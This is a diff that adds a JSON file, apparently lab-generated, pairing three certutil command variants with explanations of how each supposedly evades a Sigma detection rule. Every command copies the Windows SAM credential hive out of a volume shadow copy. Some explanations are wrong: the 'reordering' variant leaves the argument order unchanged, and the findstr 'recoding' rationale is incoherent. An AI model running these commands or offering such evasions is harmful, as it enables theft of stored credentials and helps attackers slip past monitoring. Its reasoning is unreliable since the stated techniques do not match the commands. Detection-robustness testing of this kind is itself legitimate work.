@@ -1,0 +1,14 @@
+[
+  {
+    "output": "certutil -f -v -encodehex \"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM\" C:\\Lab\\out\\SAMvss1 2",
+    "explanation": "Reordering: The command line is reordered to avoid matching the suspicious path by placing the destination path first, which may bypass the Sigma rule's path-based detection."
+  },
+  {
+    "output": "certutil -f -v -encodehex \"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM\" C:\\Lab\\out\\SAMvss1 2 >nul",
+    "explanation": "Insertion: Added a redirection to suppress output, which may avoid triggering the Sigma rule's detection based on command-line arguments."
+  },
+  {
+    "output": "certutil -f -v -encodehex \"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM\" C:\\Lab\\out\\SAMvss1 2 | findstr /v \"sensitive\"",
+    "explanation": "Recoding: Used a pipeline with findstr to filter out sensitive content, which may bypass the Sigma rule's detection by modifying the command's output."
+  }
+]
